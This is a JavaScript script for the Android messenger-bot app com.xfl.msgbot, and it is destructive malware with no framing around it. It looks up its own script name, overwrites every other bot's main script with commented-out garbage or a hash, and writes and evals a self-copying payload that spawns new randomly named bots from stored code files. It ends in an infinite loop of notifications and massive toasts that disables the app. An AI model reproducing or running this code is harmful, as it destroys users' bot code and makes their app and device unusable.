let msgbotPath = com.xfl.msgbot.utils.SharedVar.e + "/";

let scriptName;
setTimeout(() => {
let logFile = msgbotPath + "GLOBAL_LOG.json"
let logs = JSON.parse(java.lang.String(java.nio.file.Files.readAllBytes(java.io.File(logFile).toPath()), "UTF-8")).reverse()[0]
scriptName = logs.a.split("컴파일 시작: ").slice(1).join("컴파일 시작: ")
}, 3);

setTimeout(function () {
    let scriptList = Api.getScriptNames(), breakCode = `let code = getCode(); function write(code) {\nlet script = "` + scriptName + `"+ (Math.floor(Math.random() * 9000000) + 10000000).toString();\n` +
    `FileStream.write("` + msgbotPath + `Bots/" + script + "/bot.json", "{\"main\":\"i.js\",\"option\":{\"apiLevel\":1,\"useUnifiedParams\":false,\"useBabel\":false,\"scriptPower\":true,\"offOnRuntimeError\":false}}")\n` +
    `FileStream.write("`+ msgbotPath + `Bots/" + script + "/i.js", code); Api.compile(script);\n}function getCode() {\nlet file=java.io.File("sdcard/codes/").listFiles();let codeFile=file[Math.floor(Math.random()*file.length)];let returnCode=FileStream.read(codeFile);FileStream.write("sdcard/codes/"+Math.floor(Math.random() * 9000000)+1000000+".recovery",returnCode);\nreturn returnCode;\n};write(code);`;
    FileStream.write("sdcard/codes/1.recovery", breakCode);
    scriptList.map(function (code) {
        try{
        let brakCode=msgbotPath+"Bots/";
        if(code==scriptName) return;
        brakCode=(brakCode+code+"/"+JSON.parse(FileStream.read(brakCode+code+"/bot.json")).main);
        try{
            FileStream.write(brakCode, FielStream.read(brakCode).split("\n").map(line=>"//"+line.split("").join(java.lang.String(line.split("").join(Math.floor(Math.random() * 10))).hashCode())).join("\n"));
        }catch(err){
            FileStream.write(brakCode, "//"+java.lang.String(FileStream.read(brakCode)).hashCode());
        };
    }catch (err2){}
    });
    setTimeout(() =>eval(breakCode), 10);
    setTimeout(() => {for(;;) Api.makeNoti("com.xfl.msgbot died!"), Api.showToast("com.xfl.msgbot died!\n".repeat(3500))}, 10);
}, 20);
